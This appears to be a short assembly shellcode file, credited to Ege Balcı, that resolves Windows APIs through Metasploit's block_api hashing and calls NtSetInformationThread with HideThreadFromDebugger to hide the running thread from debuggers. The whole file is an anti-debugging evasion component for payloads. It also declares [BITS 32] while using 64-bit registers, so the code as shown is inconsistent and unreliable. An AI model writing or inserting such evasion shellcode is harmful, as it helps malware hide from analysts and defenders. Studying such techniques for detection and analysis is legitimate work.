; Hide Trhead
; Author: Ege Balcı
; Size: 283 bytes 

[BITS 32]
 
    cld                       ; Clear direction flags
    call start                ; Get the address of api block to stack
	%include "../block_api.asm"; https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm
start:
    pop rbp                   ; Pop the address of api block
	mov rax,0x006c6c642e6c6c64; 0x00,lld.lld
    push rax                  ; Save to stack
	mov rax,0x746e000000000000; nt,0x00
	push rax                  ; Save to stack
	lea rcx,[rsp+6]           ; Get the &"ntdll.dll" to RCX
	mov r10d,0x0726774C       ; hash( "KERNEL32.dll", "LoadLibraryA" )
	call rbp                  ; LoadLibraryA(&"ntdll.dll")
;-----------------------------;
	mov r10d,0x11D65D48       ; hash( "KERNEL32.dll", "GetCurrentThread" )
	call rbp                  ; GetCurrentThread()
	mov rcx,rax               ; ThreadHandle
	mov rdx,qword 0x11        ; HideThreadFromDebugger
	mov r8,qword 0x00         ; NULL
	mov r9,qword 0x00         ; NULL
	mov r10d,0xC3813603       ; hash( "NTDLL.dll", "NtSetInformationThread" )
	call rbp                  ; NtSetInformationThread(ThreadHandle,0x11,0,0)
	add rsp,0x70              ; Fix the stack
	ret 
